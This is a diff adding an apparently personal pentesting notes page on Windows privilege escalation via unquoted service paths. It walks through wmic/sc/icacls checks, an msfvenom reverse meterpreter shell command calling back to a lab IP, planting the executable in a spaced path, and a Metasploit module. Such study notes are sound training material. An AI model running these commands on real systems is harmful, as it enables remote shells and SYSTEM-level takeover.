@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./pts.css">
+    <title>system and host attacks unquoted service paths</title>
+</head>
+<body>
+    <header class="navbar">
+        <a href="https://github.com/puzz00" target="_blank"><img src="./images/chess_1.jpg" alt="black or white?"></a>
+        <h1>unquoted</h1>
+        <nav class="links">
+            <ul>
+                <li><a href="./index.html">home</a></li>
+                <li><a href="./host_and_network_pen_testing.html">host and network</a></li>
+                <li><a href="./system_and_host_attacks.html">system and host attacks</a></li>
+                <li><a href="./win_pe.html">win priv esc</a></li>
+                <li><a class="active" href="#">unquoted service paths</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="gallery">
+        <div class="card">
+            <a href="https://diannaosec.blogspot.com/2023/10/hacking-hack-park-thm.html" target="_blank"><img src="images/comp_7.jpg" alt="a box with an unquoted service path for priv esc"></a>
+            <a href="https://diannaosec.blogspot.com/2023/10/hacking-hack-park-thm.html" target="_blank">Hacking Hack Park - thm - Windows</a>
+        </div>
+    </section>
+    <section class="main-content">
+        <h2>Unquoted Service Paths</h2>
+        <p>
+             Unquoted Service Path vulnerabilities abuse the way Windows searches for binaries when a service is started. They are found when a path to a binary contains spaces and has not been put into quotations.
+        </p>
+        <p>
+            First of all, we need to identify a vulnerable service. We can use automated tools such as jaws.ps1 to do this, but we can do it manually, too. The manual way is to use wmic like so: <code>wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</code>
+        </p>
+        <p>
+            We will need to make sure that we can stop and start the service as the user we have gained access to the victim system as. We can do this using <code>sc stop VulnService</code> and <code>sc start VulnService</code> We can check the state of a service using <code>sc query VulnService</code>
+        </p>
+        <p>
+            We also need to make sure that the vulnerable service starts as the system user. We can do this by running <code>sc qc VulnService</code> and looking at the <code>SERVICE_START_NAME</code> which will hopefully show as <code>LocalSystem</code>
+        </p>
+        <p>
+            Next, we need to stop the service and then check the permissions of the targeted directory where we aim to upload our malicious executable file. To do this, we can navigate to the parent directory of the targeted directory and run <code>icacls VulnDirectory</code> We are looking to see if we have the ability to write to the directory or to modify it. We will hopefully see (M) or (W)
+        </p>
+        <p>
+            Our task is to upload malware into the unquoted service path at a location which will be searched by Windows before the legitimate executable for the service is found. The malware will depend on the context of the compromised machine, but a simple example would be a reverse meterpreter shell generated using msfvenom: <code>sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.46.6 LPORT=4445 --platform Windows -f exe > Vuln.exe</code>
+        </p>
+        <p>
+            Assuming that we can write to the targeted directory, we can now upload our malware in the path of the service and give it a name which will be executed when the service starts. When trying to work out where to place the malware, we can look for where there are spaces in the unquoted service path. Here is an example: <code>C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe</code> In this example, we could try to place our malware at the following path: <code>C:\Program Files\VMware\VMware.exe</code>
+        </p>
+        <p>
+            Here is another example of an unquoted service path: <code>C:\Program Files(x86)\Canon\IJ Scan Utility\SETEVENT.exe</code> We could try to place our malware at the following path: <code>C:\Program Files(x86)\Canon\IJ.exe</code>
+        </p>
+        <p>
+            We can now start a handler before starting the service on the victim machine. It might be that the shell is unstable, so we can migrate it to a different process when it starts by modifying the handler before running it set <code>set AutoRunScript migrate -n svchost.exe</code> We could also use <code>set AutoRunScript migrate -f</code> to spawn a new notepad process which will be migrated to automatically.
+        </p>
+        <p>
+            msfconsole also has a module we can use to automatically exploit unquoted service paths: <code>use exploit/windows/local/trusted_service_path</code>
+        </p>
+    </section>
+    <section class="extra-info">
+        <p class="tagline">
+            water shapes its course according to the nature of the ground over which it flows - the soldier works out his victory in relation to the foe whom he is facing
+        </p>
+        <div class="contact">
+            <p>puzz00</p>
+            <a href="https://github.com/puzz00" class="active" target="_blank">knock knock</a>
+        </div>
+    </section>
+</body>
+</html>
